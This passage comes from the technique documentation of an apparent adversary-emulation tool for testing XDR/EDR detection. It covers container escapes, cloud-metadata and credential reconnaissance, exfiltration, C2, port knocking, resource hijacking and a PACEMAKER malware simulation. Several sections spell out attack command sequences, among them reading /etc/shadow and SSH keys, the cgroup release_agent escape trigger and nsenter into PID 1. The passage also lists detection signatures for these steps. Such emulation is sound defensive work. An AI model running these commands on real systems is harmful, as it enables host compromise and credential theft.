A matching host init name proves nsenter actually entered the host PID
namespace. On success it logs `[T1611-PRIV] [VERIFIED] ...` followed by
`[T1611-PRIV] [CRITICAL] Host filesystem access VERIFIED: ...`; on
failure it logs `[T1611-PRIV] [UNVERIFIED] ...`.

### T1611-MOUNT - Sensitive Mount Escape

Description:  
Detects sensitive host filesystem mounts that enable container escape. Executes mount enumeration, file access attempts, and write tests to generate telemetry. When host filesystem is accessible, PERFORMS CHROOT ESCAPE to create marker file on host.

How it works:
1. Enumerates all mount points
2. Attempts to read sensitive files from mounted paths
3. Tests write access to mounted filesystems
4. Identifies Docker socket and sensitive host path mounts
5. CHROOTS INTO HOST FILESYSTEM to prove full host access
6. Creates marker file /tmp/signalbench_mount_escape_marker on host via chroot
7. Cleans up marker file automatically via chroot during cleanup

Commands Executed:
```bash
findmnt -l                                  # List all mount points
df -h                                       # Filesystem disk usage
cat /etc/shadow                             # Read shadow file (if accessible)
cat /etc/sudoers                            # Read sudoers file
cat /root/.ssh/id_rsa                       # Read SSH private key
cat /root/.ssh/authorized_keys              # Read SSH authorized keys
ls -la /hostfs/                             # List host filesystem mount
ls -la /host/                               # List alternative host mount
touch /tmp/signalbench_write_test           # Write test in mounted path
mount --bind / /tmp/signalbench_root_bind   # Bind mount host root
chroot /host /bin/sh -c "echo 'SignalBench...' > /tmp/signalbench_mount_escape_marker"  # ACTUAL HOST CHROOT
```

Parameters:
- `output_dir`: Directory for mount enumeration output
- `test_read`: Attempt to read sensitive files from mounted paths
- `test_write`: Test write access to mounted paths

Artefacts:
- Mount points dump file (cleaned up automatically after execution)
- Sensitive file read results (cleaned up automatically after execution)
- Mount escape report (cleaned up automatically after execution)
- Host marker file: /tmp/signalbench_mount_escape_marker (cleaned up automatically via chroot)

XDR Detection Signatures:
- chroot command execution from container
- File creation in host /tmp via chroot escape
- findmnt and df -h mount enumeration
- cat commands targeting /etc/shadow, /etc/sudoers
- Access to SSH keys in /root/.ssh/
- Write attempts to host-mounted paths (/host, /hostfs)
- mount --bind attempts from containers
- Sensitive file access patterns from container processes
- ln -s creation of symlinks in /var/log (K8s escape, Unit42)
- Symlinks pointing to / or /etc from log directories
- touch tests on /var/log for write access checks
- find -type l enumeration of symlinks in log paths
- Symlink traversal attempts via /var/log/signalbench_*
- K8s hostPath log volume symlink manipulation

Host Access Verification:
After each chroot marker write, this technique reads the container's
own `/etc/machine-id` directly, then runs
`chroot <bind_target> /bin/cat /etc/machine-id` and
`chroot /host /bin/cat /etc/machine-id` (10 s timeout each) and
requires the chroot-side value to be non-empty AND different from the
container's machine-id. The machine-id is a per-installation
identifier, so a different value proves the chroot landed on a
genuinely separate filesystem (the host root); equal values mean we
chrooted into our own root and nothing was actually escaped. A simple
`uname -a` check is insufficient because `/bin/uname` is not host-only
and non-empty output does not establish host context. Each successful
read logs `[T1611-MOUNT] [VERIFIED] ...` followed by
`[T1611-MOUNT] [CRITICAL] Host filesystem access VERIFIED: ...`;
failures log `[T1611-MOUNT] [UNVERIFIED] ...` with both machine-ids in
the evidence.

### T1611-CGROUP - cgroup Release Agent Escape

Description:  
Detects and exploits container escape via cgroup release_agent mechanism (CVE-2022-0492). EXECUTES ACTUAL RELEASE_AGENT SCRIPT on host by mounting cgroup, writing executable payload to release_agent, and triggering via cgroup.procs.

How it works:
1. Checks for CAP_SYS_ADMIN capability
2. Mounts cgroup filesystem inside container
3. Creates new cgroup and enables notify_on_release
4. CREATES ACTUAL PAYLOAD SCRIPT that writes marker file on host
5. Writes payload path to release_agent
6. TRIGGERS RELEASE_AGENT by writing process to cgroup.procs and exiting
7. Verifies escape success by checking for marker file creation
8. Cleans up marker file and payload automatically

Commands Executed:
```bash
cat /proc/self/cgroup                       # Current cgroup membership
cat /proc/self/mountinfo                    # Mount namespace info
mount | grep cgroup                         # Existing cgroup mounts
mount -t cgroup -o rdma cgroup /tmp/signalbench_cgroup_test  # Mount cgroup
mkdir /tmp/signalbench_cgroup_test/x        # Create cgroup directory
echo 1 > /tmp/signalbench_cgroup_test/x/notify_on_release    # Enable notification
cat /tmp/signalbench_cgroup_test/release_agent               # Read release_agent
chmod +x /tmp/signalbench_cgroup_escape/cgroup_escape_payload.sh  # Make payload executable
echo /tmp/signalbench.../payload.sh > .../release_agent      # WRITE ACTUAL PAYLOAD PATH
sh -c 'echo $$ > .../cgroup.procs && exit 0'                 # TRIGGER RELEASE_AGENT
```

Parameters:
- `output_dir`: Directory for cgroup escape simulation output
- `simulate_payload`: Create payload script (EXECUTED when escape succeeds)

Artefacts:
- cgroup enumeration files (cleaned up automatically after execution)
- Escape payload script (cleaned up automatically after execution)
- cgroup escape report (cleaned up automatically after execution)
- Host marker file: /tmp/signalbench_cgroup_escape_marker (cleaned up automatically)

XDR Detection Signatures:
- mount -t cgroup from container process
- Writes to release_agent files from container
- chmod +x on scripts in container /tmp
- echo to notify_on_release enabling cgroup notifications
- cgroup.procs writes triggering release_agent execution
- CVE-2022-0492 exploitation sequence detection
- Script execution on host triggered by cgroup release
- File creation in host /tmp from release_agent
- mkdir in cgroup hierarchies from container
- cat /etc/mtab for host overlay path discovery (Unit42)
- cat /proc/self/mountinfo for mount namespace info (Unit42)
- Parsing of overlay upperdir paths to find host filesystem
- Host path discovery via overlay2 storage driver paths

Host Access Verification:
After triggering release_agent, this technique polls
`/tmp/signalbench_cgroup_escape_marker` for up to 10 seconds (500 ms
interval). On detection it logs `[T1611-CGROUP] [VERIFIED] ...`
followed by `[T1611-CGROUP] [CRITICAL] Host filesystem access
VERIFIED: ...`; on timeout it logs `[T1611-CGROUP] [UNVERIFIED] marker
not observed within 10s`. If preconditions for the trigger phase were
not met (CAP_SYS_ADMIN missing, mount blocked, or
`attempt_cgroup_mount=false`), an explicit
`[T1611-CGROUP] [UNVERIFIED] release_agent verification phase not
reached (...)` line is emitted at the end of the technique so every
run carries a marker.

### T1611-MODULE - Kernel Module Escape

Description:  
Detects container escape potential via kernel module loading (CAP_SYS_MODULE). Executes module enumeration and ATTEMPTS TO LOAD SUSPICIOUS FAKE MODULES to generate XDR telemetry. modprobe commands for non-existent modules fail safely but trigger security alerts.

How it works:
1. Checks for CAP_SYS_MODULE capability
2. Executes module enumeration commands
3. ATTEMPTS modprobe for fake suspicious modules (signalbench_rootkit, signalbench_backdoor, signalbench_keylogger)
4. Module loading FAILS SAFELY (modules do not exist) but generates security telemetry
5. Identifies security modules and available module tools

Commands Executed:
```bash
lsmod                                       # List loaded modules
modinfo ip_tables                           # Module information
cat /proc/modules                           # Kernel module information
ls -la /lib/modules/$(uname -r)/            # Available kernel modules
modprobe --show-depends vfat                # Show module dependencies (read-only, safe)
head -50 /proc/kallsyms                     # Kernel symbol table sample
modprobe signalbench_rootkit                # ATTEMPT SUSPICIOUS MODULE LOAD (fails safely)
modprobe signalbench_backdoor               # ATTEMPT SUSPICIOUS MODULE LOAD (fails safely)
modprobe signalbench_keylogger              # ATTEMPT SUSPICIOUS MODULE LOAD (fails safely)
modprobe rootkit                            # ATTEMPT SUSPICIOUS MODULE LOAD (fails safely)
```
Note: modprobe attempts for fake modules ALWAYS FAIL (modules do not exist) but generate
valuable XDR telemetry for detecting malicious module loading attempts. The suspicious
module names (rootkit, backdoor, keylogger) should trigger security alerts.

Parameters:
- `output_dir`: Directory for kernel module escape simulation output
- `enumerate_modules`: Enumerate currently loaded kernel modules
- `test_insmod`: Attempt suspicious module loading (generates telemetry, always fails safely)

Artefacts:
- Loaded modules list (cleaned up automatically after execution)
- Simulated rootkit source code (cleaned up automatically after execution)
- Module escape report (cleaned up automatically after execution)

XDR Detection Signatures:
- modprobe commands with suspicious module names (rootkit, backdoor, keylogger)
- Module loading attempts from container processes
- lsmod and modinfo enumeration from containers
- Access to /lib/modules/ directory from container
- /proc/modules access patterns
- /proc/kallsyms access (kernel symbol enumeration)
- CAP_SYS_MODULE capability checks
- insmod/modprobe execution from non-root namespaces

### T1611-RECON - Container Environment Reconnaissance

Description:  
Comprehensive container environment enumeration inspired by deepce. Executes DNS queries, cloud metadata access, credential hunting, and network scanning to generate telemetry.

How it works:
1. Detects container runtime and environment
2. Performs DNS lookups and network reconnaissance
3. Accesses cloud metadata endpoints
4. Hunts for credentials in environment variables and files

Commands Executed:
```bash
dig +short kubernetes.default.svc.cluster.local  # Kubernetes DNS lookup
nslookup kubernetes.default                 # Alternative DNS lookup
curl -s http://169.254.169.254/latest/meta-data/  # AWS metadata endpoint
curl -s http://169.254.169.254/computeMetadata/v1/  # GCP metadata endpoint
curl -s http://169.254.169.254/metadata/instance  # Azure metadata endpoint
env | grep -iE "(PASSWORD|SECRET|TOKEN|KEY|API|CREDENTIAL)"  # Credential hunt
cat /var/run/secrets/kubernetes.io/serviceaccount/token  # K8s service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt  # K8s CA certificate
nc -zv $(ip route | grep default | awk '{print $3}') 22 2375 10250  # Gateway port scan
cat ~/.aws/credentials                      # AWS credentials file
cat ~/.docker/config.json                   # Docker config
```

Parameters:
- `output_dir`: Directory for reconnaissance output
- `scan_gateway`: Scan host gateway for common services
- `credential_hunt`: Search for credentials in environment and files

Artefacts:
- Environment variables dump (redacted) (cleaned up automatically after execution)
- DNS lookup results (cleaned up automatically after execution)
- Cloud metadata responses (cleaned up automatically after execution)
- Reconnaissance report (cleaned up automatically after execution)

XDR Detection Signatures:
- dig/nslookup DNS queries for Kubernetes services
- curl requests to 169.254.169.254 metadata endpoints
- env | grep patterns for credential hunting
- Access to Kubernetes service account tokens
- Port scanning of gateway IP addresses
- Access to credential files (.aws, .docker)
- ls -la /.dockerenv container detection (deepce)
- cat /proc/1/cgroup for container ID extraction (deepce)
- grep 'overlay|aufs' /proc/self/mountinfo (deepce)
- cat /proc/self/status | grep Cap capability check (deepce)
- ls -la /proc/1/ns/ namespace enumeration (deepce)
- grep Seccomp /proc/self/status security check (deepce)
- cat /proc/self/attr/current AppArmor profile check (deepce)
- which docker crictl kubectl ctr tool discovery (deepce)
- /var/run/docker.sock socket presence checks (deepce)
- /dev/sda block device access detection (deepce)

### T1611-PIDNS - Host PID Namespace Escape

Description:  
Detects container escape potential via shared host PID namespace (--pid=host). Executes process enumeration, ptrace attempts, and namespace escape commands. When escape succeeds, CREATES MARKER FILE ON HOST via nsenter.

How it works:
1. Checks for CAP_SYS_PTRACE capability
2. Executes process enumeration commands
3. Attempts ptrace operations against host processes
4. Tests namespace escape via nsenter --target 1 --all
5. ON SUCCESS: Creates marker file /tmp/signalbench_pidns_escape_marker on host via nsenter
6. Cleans up marker file automatically via nsenter during cleanup

Commands Executed:
```bash
ps aux                                      # Full process listing
cat /proc/1/cmdline                         # PID 1 command line
ls -la /proc/1                              # PID 1 directory listing
readlink /proc/1/ns/pid                     # PID 1 namespace
readlink /proc/self/ns/pid                  # Current PID namespace
pstree -p                                   # Process tree with PIDs
cat /proc/1/status                          # PID 1 status information
timeout 1 strace -p 1                       # Attempt to trace PID 1
timeout 2 gdb -p 1 -batch -ex quit          # Attempt to debug PID 1
nsenter --target 1 --all -- id              # Namespace escape attempt
nsenter --target 1 --all -- /bin/sh -c "echo 'SignalBench...' > /tmp/signalbench_pidns_escape_marker"  # ACTUAL HOST ACCESS
cat /proc/1/environ                         # PID 1 environment variables
```

Parameters:
- `output_dir`: Directory for PID namespace escape simulation output
- `enumerate_processes`: Enumerate visible processes to detect host PID namespace
- `test_ptrace`: Attempt ptrace operations against host processes

Artefacts:
- Process list dump (cleaned up automatically after execution)
- PID 1 information files (cleaned up automatically after execution)
- Ptrace escape commands (cleaned up automatically after execution)
- PID namespace escape report (cleaned up automatically after execution)
- Host marker file: /tmp/signalbench_pidns_escape_marker (cleaned up automatically via nsenter)

XDR Detection Signatures:
- nsenter --target 1 --all with command execution
- File creation on host via namespace escape
- ps aux and pstree commands from containers
- Access to /proc/1/ files (cmdline, status, environ)
- strace -p 1 and gdb -p 1 ptrace attempts
- readlink on /proc/*/ns/pid namespace files
- Containers started with --pid=host flag
- CAP_SYS_PTRACE capability usage from container

Host Access Verification:
A naive comparison of `readlink /proc/1/ns/pid` and `readlink
/proc/self/ns/pid` from inside the container is unsound: in a normal
container both calls return the container's PID namespace, and in a
`--pid=host` container both calls return the host's PID namespace, so the
two values always match. Instead this technique verifies against a host
baseline by reading `/proc/1/comm` and `/proc/1/cmdline` and comparing
them to known host init names (`systemd`, `init`, `upstart`, `openrc`,
`sysvinit`, `launchd`) and host init paths (`/sbin/init`,
`/lib/systemd/systemd`, `/usr/lib/systemd/systemd`, `/usr/sbin/init`),
combined with a count of numeric `/proc` entries (visible PIDs).
Verification requires both signals: an init-style PID 1 AND visible PID
count above 50 (the typical container ceiling). On success it logs
`[T1611-PIDNS] [VERIFIED] ...` followed by `[T1611-PIDNS] [CRITICAL]
Host filesystem access VERIFIED: ...`; otherwise it logs
`[T1611-PIDNS] [UNVERIFIED] ...` with the observed signals.

### T1611-SUID - SUID Privilege Escalation Escape

Description:  
Detects container escape potential via SUID binary manipulation on shared directories. When a host directory is mounted into a container with write access, setting the SUID bit on executables can lead to privilege escalation on the host when executed by host users.

How it works:
1. Checks if running as root (required to set SUID bit)
2. Checks for same user namespace as host (required for SUID to work on host)
3. Creates test SUID binary in output directory
4. SETS SUID BIT using chmod u+s and chmod 4755
5. Enumerates existing SUID and SGID binaries on system
6. Tests SUID bit manipulation on shared mount points
7. Identifies common dangerous SUID binaries
8. Checks mount options for nosuid restrictions

Commands Executed:
```bash
id                                          # Check current user/permissions
readlink /proc/self/ns/user                 # Self user namespace
readlink /proc/1/ns/user                    # Host user namespace (same = escape possible)
chmod +x /tmp/signalbench_suid_test.sh      # Make test binary executable
chmod u+s /tmp/signalbench_suid_test.sh     # SET SUID BIT (escape vector)
chmod 4755 /tmp/signalbench_suid_test_alt   # Alternative SUID method
ls -la /tmp/signalbench_suid_escape/        # Verify SUID bit with -rws pattern
stat /tmp/signalbench_suid_test.sh          # Detailed file permissions
find /usr -perm -4000 2>/dev/null | head -20  # Enumerate existing SUID binaries
find /usr -perm -2000 2>/dev/null | head -10  # Enumerate existing SGID binaries
mount | grep nosuid                         # Check nosuid mount restrictions
chmod u+s /shared_mount/signalbench_suid_test  # SUID on shared directory (ACTUAL ESCAPE)
```

Parameters:
- `output_dir`: Directory for SUID escape simulation output (default: /tmp/signalbench_suid_escape)
- `test_shared_dirs`: Attempt SUID manipulation on detected shared mount points

Artefacts:
- SUID test binary (cleaned up automatically after execution)
- SUID enumeration results (cleaned up automatically after execution)
- SUID escape report (cleaned up automatically after execution)

XDR Detection Signatures:
- chmod u+s or chmod 4755 commands from container
- SUID bit modifications on files in shared directories
- find -perm -4000 SUID binary enumeration
- find -perm -2000 SGID binary enumeration
- readlink /proc/*/ns/user namespace comparison
- File permission changes (setuid/setgid) on mount points
- Container processes modifying file permissions to include 's' bit
- Dangerous SUID binaries (python, bash, find, vim, nmap, etc.)

## EXFILTRATION Techniques

### T1048 - Exfiltration Over Alternative Protocol

Description:  
Executes REAL data exfiltration using alternative protocols such as DNS, ICMP, or HTTP.

How it works:
1. Creates a file with simulated sensitive data for exfiltration
2. Encodes and formats data for the chosen protocol (base64 for DNS/HTTP, hex for ICMP)
3. Simulates the exfiltration process by showing the commands that would be executed
4. Creates detailed logs of the exfiltration process

Parameters:
- `protocol`: Protocol to use for exfiltration (dns, icmp, http)
- `data_file`: Path to save simulated data to be exfiltrated
- `log_file`: Path to save exfiltration log
- `target`: Target for exfiltration (domain for DNS, IP for ICMP, URL for HTTP). DNS default: `t1048.signalbench.sigre.xyz` (GoCortex-controlled exfil sink)

Artefacts:
- Exfiltration data file (cleaned up automatically after execution)
- Exfiltration log file (cleaned up automatically after execution)

Detection opportunities:
- Unusual DNS queries with encoded data in subdomains
- ICMP packets with custom data payloads
- HTTP requests with encoded data in parameters
- High volume of network traffic using a single protocol

## COMMAND_AND_CONTROL Techniques

### T1095 - Non-Application Layer Protocol

Description:  
Executes actual command and control communications using non-application layer protocols (TCP, UDP, ICMP).

How it works:
1. Creates a file with C2 commands to be executed
2. Establishes actual communication channels using the chosen protocol
3. Transmits encoded commands and receives responses over the network
4. Uses netcat (nc) for TCP/UDP communications and ping for ICMP
5. Creates detailed logs of all C2 communication operations

Parameters:
- `protocol`: Protocol to use (icmp, tcp, udp)
- `target`: Target IP address
- `port`: Target port (for TCP/UDP)
- `log_file`: Path to save C2 simulation log
- `command_file`: Path to save C2 commands

Artefacts:
- C2 command file (cleaned up automatically after execution)
- C2 simulation log file (cleaned up automatically after execution)
- Temporary network socket files (cleaned up automatically)

Detection opportunities:
- Unusual protocol usage patterns
- Base64 or hex-encoded data in network traffic
- Regular beaconing or communication intervals
- Communication with unusual or suspicious external endpoints
- Use of netcat or similar networking tools

### T1205 - Traffic Signaling

Description:  
Installs iptables LOG rules to flag inbound SYN packets on a defined knock-port sequence, then sends the outbound knock sequence to the sinkhole. Both the receive-side ruleset and the offensive traffic pattern are produced so detection rules on either side can be exercised.

How it works:
1. Validates the network interface and captures the current INPUT chain rule count for cleanup baseline
2. Installs iptables LOG rules with a `PORT_KNOCK[<port>]:` prefix on each port in the knock sequence (defaults: 1337, 31337, 8080) so SYN packets to these ports appear in syslog with that marker
3. Resolves the sinkhole IP and sends the outbound knock sequence: a TCP connect probe to each port in order, paced at 250ms apart so the sequence is recognisable as port knocking rather than a parallel scan. Prefers `nc -z -w 1 <ip> <port>` so the `nc` binary name appears in argv (the canonical port-knock fingerprint); falls back to a direct Tokio TCP connect when `nc` is not on PATH.
4. Logs both the rule installation status and the outbound knock results to the technique log
5. Cleanup removes the installed iptables rules

Parameters:
- `interface`: Network interface to validate (default: eth0)
- `knock_ports`: Comma-separated port knock sequence (default: 1337,31337,8080)
- `log_file`: Path to save the technique log (default: /tmp/signalbench_port_knocking.log)

Artefacts:
- Installed iptables LOG rules, tracked per port and removed on cleanup
- Technique log at `/tmp/signalbench_port_knocking.log` (cleaned up automatically)

Detection opportunities:
- `iptables -A INPUT ... -j LOG --log-prefix 'PORT_KNOCK[...]'` invocations
- Outbound TCP SYN bursts to a fixed port sequence at sub-second pacing (port-knock client signature)
- `nc -z` invocations against multiple ports in rapid succession to the same host
- Syslog entries with the `PORT_KNOCK[<port>]:` prefix when inbound SYN packets land on monitored ports

### T1105 - Ingress Tool Transfer

Description:  
Downloads actual test files from external sources and attempts to execute them to test EDR/AV detection capabilities.

How it works:
1. Downloads files using curl or wget from specified URLs
2. Downloads include publicly available test files designed for security testing
3. Makes downloaded files executable and attempts to run them
4. Creates detailed logs of download operations and execution attempts
5. Default source is the Palo Alto Networks test file URL

Parameters:
- `url`: URL to download the malicious file from
- `output_dir`: Directory to save downloaded files
- `download_tool`: Tool to use for downloading (curl or wget)
- `execution_attempt`: Whether to attempt execution of downloaded files

Artefacts:
- Downloaded test files (cleaned up automatically after execution)
- Download and execution log file (cleaned up automatically)

Detection opportunities:
- File downloads from known security testing URLs
- Executable files being downloaded and made executable
- Attempt to execute recently downloaded files
- Suspicious file characteristics in downloaded content
### T1105.001 - Suspicious GitHub Tool Transfer

Description:  
Generates telemetry for curl requests to fictional GitHub repositories with hacker-themed names to trigger URL/domain-based anomaly detection systems.

How it works:
1. Randomly generates GitHub repository names with suspicious suffixes (exploit-kit, backdoor-tool, credential-dumper, etc.)
2. All repositories use the 'github.com/simonsigre/' prefix for consistency
3. Attempts curl requests to these fictional repositories (will return 404 but generates telemetry)
4. Creates realistic network request patterns that match tool download behaviour
5. Logs all download attempts and responses

Parameters:
- `repo_count`: Number of suspicious GitHub repos to attempt downloading from (default: 5)
- `log_file`: Path to save download attempt log (default: /tmp/signalbench_github_downloads.log)

Artefacts:
- GitHub download attempt log file (cleaned up automatically after execution)

Detection opportunities:
- Monitor for curl/wget requests to GitHub repositories with suspicious names
- Detection of URL patterns matching known attack tool repositories
- Network requests to rare or never-before-seen GitHub URLs
- Consecutive GitHub download attempts in short time periods
- URL/domain baseline anomaly detection for github.com/*/exploit-kit, github.com/*/backdoor-tool patterns
- Repository names containing keywords: exploit, backdoor, credential, ransomware, keylogger, botnet, webshell, rootkit, stealer, trojan
- HTTP 404 responses from GitHub repositories (fictional repos)

## COLLECTION Techniques

### T1119 - Automated Collection

Description:  
Performs REAL automated data collection by recursively enumerating and harvesting files from target directories. This technique creates actual file archives containing collected data whilst maintaining 100% safety by only accessing non-sensitive test locations.

How it works:
1. Performs REAL recursive directory enumeration using find and ls -R
2. Searches for files matching collection criteria:
   - Document files (.pdf, .doc, .docx, .txt, .odt)
   - Spreadsheets (.xls, .xlsx, .csv, .ods)
   - Configuration files (.conf, .cfg, .ini, .yaml, .json)
   - Database files (.db, .sqlite, .sql)
   - Archive files (.zip, .tar, .gz, .7z)
   - Script files (.sh, .py, .rb, .pl)
3. Creates REAL compressed archives using tar and zip
4. Implements file staging in /tmp collection directory
5. Calculates file hashes (MD5, SHA256) for collected files
6. Generates collection manifests with file metadata:
   - File paths
   - File sizes
   - Modification timestamps
   - File permissions
   - Owner/group information
7. Performs content-based searches using grep for sensitive keywords
8. Tests multiple collection techniques:
   - Recursive find with -name patterns
   - grep -r for content matching
   - locate database searches
9. Simulates data staging for exfiltration preparation
10. Creates realistic collection statistics and reports

Parameters:
- `target_dirs`: Comma-separated list of directories to collect from (default: /tmp,/var/tmp)
- `file_patterns`: Comma-separated list of file extensions to collect (default: txt,pdf,doc,xls,csv)
- `create_archive`: Whether to create compressed archive of collected files (default: true)
- `archive_format`: Archive format to use - tar, zip, 7z (default: tar)
- `calculate_hashes`: Whether to calculate file hashes (default: true)
- `content_search`: Whether to search file contents for keywords (default: true)
- `search_keywords`: Comma-separated keywords to search for (default: password,secret,key,token)

Artefacts:
- Collection staging directory /tmp/signalbench_collection_<timestamp> (cleaned up automatically)
- Compressed archives of collected files (cleaned up automatically)
- Collection manifest files with metadata (cleaned up automatically)
- File hash databases (cleaned up automatically)
- Content search results (cleaned up automatically)

Detection opportunities:
- Monitor recursive directory enumeration (find, ls -R commands)
- Detect archive creation operations (tar, zip, 7z execution)
- Watch for file access patterns indicating systematic collection
- Monitor creation of staging directories in /tmp
- Detect file hash calculation operations
- Track grep -r operations searching for sensitive keywords
- Monitor file access to multiple document/database files in short time periods
- Unusual archive file creation with large file counts

## IMPACT Techniques

### T1496 - Resource Hijacking

Description:  
Performs REAL resource hijacking by consuming CPU, memory, and disk I/O to simulate cryptomining or resource exhaustion attacks. This technique uses actual system stress tools whilst maintaining 100% safety through controlled execution and automatic cleanup.

How it works:
1. Implements REAL CPU consumption using stress-ng or custom CPU burners
2. Creates CPU-intensive operations:
   - Spawns multiple worker threads (one per CPU core)
   - Executes infinite loops with mathematical operations
   - Simulates cryptographic hashing (SHA-256, MD5)
3. Performs REAL memory consumption:
   - Allocates large memory blocks
   - Fills memory with data to trigger swapping
   - Creates memory pressure conditions
4. Executes REAL disk I/O saturation:
   - Writes large files to disk repeatedly
   - Performs random read/write operations
   - Stresses disk throughput with dd operations
5. Simulates cryptocurrency mining behaviour:
   - Renames the main process and each CPU stress thread via `prctl(PR_SET_NAME)` to recognised cryptominer names (`xmrig`, `kdevtmpfsi`, `kinsing`, `t-rex`) so the comm field shown in `ps`, `/proc/<pid>/comm`, and `/proc/<pid>/task/<tid>/comm` matches what XDR rules for resource hijacking key on. CPU stress threads are OS threads (`std::thread`), not tokio tasks, so the prctl rename does not disturb the async runtime.
   - The original process name is restored when the stress window ends
   - Generates realistic mining process telemetry
6. Implements resource monitoring:
   - Tracks CPU usage percentages
   - Monitors memory consumption
   - Measures disk I/O rates
7. Uses multiple stress tools:
   - stress-ng (comprehensive system stress)
   - cpulimit (CPU throttling)
   - Custom bash/python stress scripts
8. Creates realistic resource hijacking indicators:
   - High sustained CPU usage (80-100%)
   - Memory exhaustion patterns
   - Disk thrashing behaviour

Parameters:
- `stress_type`: Type of resource to stress - cpu, memory, disk, all (default: cpu)
- `cpu_workers`: Number of CPU worker threads (default: number of CPU cores)
- `duration`: Duration in seconds to run stress test (default: 30)
- `memory_size`: Amount of memory to consume in MB (default: 512)
- `disk_write_size`: Size of disk writes in MB (default: 100)
- `simulate_miner`: Whether to simulate cryptocurrency miner behaviour (default: true)
- `miner_name`: Name to use for simulated miner process (default: xmrig)

Artefacts:
- Stress test processes (terminated automatically after duration)
- Large temporary files for disk I/O testing (cleaned up automatically)
- Memory allocation buffers (freed automatically)
- Simulated miner processes (killed automatically)
- Resource consumption logs (cleaned up automatically)

Detection opportunities:
- Monitor sustained high CPU usage (>80% for extended periods)
- Detect process names matching known cryptocurrency miners
- Watch for unusual memory consumption patterns
- Monitor disk I/O saturation and thrashing
- Detect stress-ng, cpulimit, or similar tool execution
- Track processes consuming disproportionate system resources
- Monitor network connections to known mining pool addresses
- Detect mathematical operations indicative of mining (cryptographic hashing)
- Process tree analysis showing suspicious resource-intensive children

## SOFTWARE Simulations

The SOFTWARE category contains simulations of known malware families identified in the MITRE ATT&CK framework. These simulations use embedded helper binaries that match YARA signatures and behavioural patterns of real malware while remaining completely benign and safe to execute.

### S1109 - PACEMAKER

**EXPERIMENTAL: This implementation represents a research-grade simulation of PACEMAKER malware behaviour. Whilst the binary contains exact YARA signature matches and simulates documented credential-stealing techniques, there is no guarantee that endpoint detection and response (EDR) tools will generate alerts. This simulation has been developed to match Mandiant's technical documentation as closely as possible for security analytics research and training purposes.**

Description:  
Deploys a benign simulation of the PACEMAKER credential stealer that matches YARA signatures and behavioural patterns documented in the Mandiant April 2021 Pulse Secure APT investigation. This simulation contains an embedded 64-bit ELF binary with YARA signature strings and simulates the /proc filesystem credential scraping behaviour used by UNC2630 (suspected APT5) in attacks against U.S. Defense Industrial Base companies.

**Attribution:**  
PACEMAKER was used by threat group UNC2630 from August 2020 through March 2021 against U.S. Defense Industrial Base (DIB) companies. Mandiant assesses that UNC2630 operates on behalf of the Chinese government and may have ties to APT5. The malware was part of a sophisticated toolkit alongside SLOWPULSE, RADIALPULSE, THINBLOOD, and ATRIUM used to compromise Pulse Secure VPN appliances and harvest credentials for lateral movement into victim networks.

**Background:**  
PACEMAKER is a credential-stealing malware documented in Mandiant's April 19, 2021 report "Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass Techniques and Pulse Secure Zero-Day". The malware reads process memory via the /proc filesystem to extract authentication credentials from Pulse Secure VPN daemon processes. It writes harvested credentials to files in /tmp with `.statementcounters` extensions to blend in with legitimate Pulse Secure system files, making detection more difficult.

The malware specifically targets authentication realms used by Pulse Secure VPN including LDAP, RADIUS, and ACE authentication systems, extracting usernames, passwords, and authentication tokens from process memory.

How it works:
1. Extracts an embedded 64-bit ELF binary to /tmp/signalbench_sim-pacemaker
2. The binary contains YARA signature strings matching FE_APT_Trojan_Linux_PACEMAKER rules:
   - `/proc/%d/mem` - Used to read process memory for credential extraction
   - `/proc/%s/maps` - Used to locate credential data in memory regions
   - `/proc/%s/cmdline` - Used to identify target Pulse Secure daemon processes
   - `Name:%s || Pwd:%s || AuthNum:%s` - Credential format string for harvested data
3. Creates a launcher script based on the documented PACEMAKER launcher (SHA256: 4c5555955b2e6dc55f52b0c1a3326f3d07b325b112060329c503b294208960ec). Note: The generated script uses different paths (/tmp/signalbench_sim-pacemaker instead of /home/bin/memread) and includes comments, so it will not produce an exact SHA256 match to the original. The functional behaviour remains identical.
4. Simulates realistic /proc filesystem inspection behaviour:
   - Reads /proc/self/maps to simulate memory region scanning
   - Reads /proc/self/cmdline to simulate process identification
   - Attempts to access /proc/self/mem to simulate credential extraction
5. Executes the simulation with parameters: `-t <timeout> -m 16 -s 2` (mimicking memread utility)
6. Creates three credential harvesting files matching Mandiant documentation:
   - /tmp/signalbench_sim_dsactiveuser.statementcounters
   - /tmp/signalbench_sim_dsstartssh.statementcounters
   - /tmp/signalbench_sim_dsserver-check.statementcounters

Parameters:
- `timeout`: Timeout in seconds for memread simulation (default: 3)
- `memory_size`: Memory read size in MB (default: 16)
- `scan_interval`: Memory scan interval in seconds (default: 2)

Artefacts:
- /tmp/signalbench_sim-pacemaker (ELF binary with YARA signatures, cleaned up automatically)
- /tmp/signalbench_sim-pacemaker-launcher.sh (bash launcher script, cleaned up automatically)
- /tmp/signalbench_sim_dsactiveuser.statementcounters (credential file, cleaned up automatically)
- /tmp/signalbench_sim_dsstartssh.statementcounters (credential file, cleaned up automatically)
- /tmp/signalbench_sim_dsserver-check.statementcounters (credential file, cleaned up automatically)

**YARA Detection:**
This simulation is designed to trigger YARA rules from the Mandiant/FireEye PulseSecure APT report:
- `FE_APT_Trojan_Linux_PACEMAKER`: Detects ELF binaries with proc filesystem strings and credential format
- `FE_APT_Trojan_Linux32_PACEMAKER`: Detects 32-bit ELF binaries with specific x86 byte patterns

To test YARA detection:
```bash
# Run simulation with artefacts preserved
signalbench run S1109 --no-cleanup

# Scan with YARA rules
yara -s pacemaker_rules.yar /tmp/signalbench_sim-pacemaker
```

Detection opportunities:
- YARA signature detection (FE_APT_Trojan_Linux_PACEMAKER rules)
- File creation patterns in /tmp/ds*.statementcounters
- Execution of binaries from /tmp directory
- Process memory access patterns (/proc/*/mem, /proc/*/maps access)
- Suspicious process names or command-line arguments
- File naming patterns matching known APT artefacts
- Behavioural analysis of credential harvesting activities

**References:**
- Mandiant Report: "Suspected APT Actors Leverage Bypass Techniques, Pulse Secure Zero-Day"
- MITRE ATT&CK Software: https://attack.mitre.org/software/S1109/

## PRIVILEGE ESCALATION - GTFOBins Integration

### T1548-GTFOBINS - GTFOBins Privilege Escalation Probe

**Attribution:** Based on GTFOBins (gtfobins.github.io), Traitor (liamg/traitor), and LinPEAS (carlospolop/PEASS-ng)

Description:  
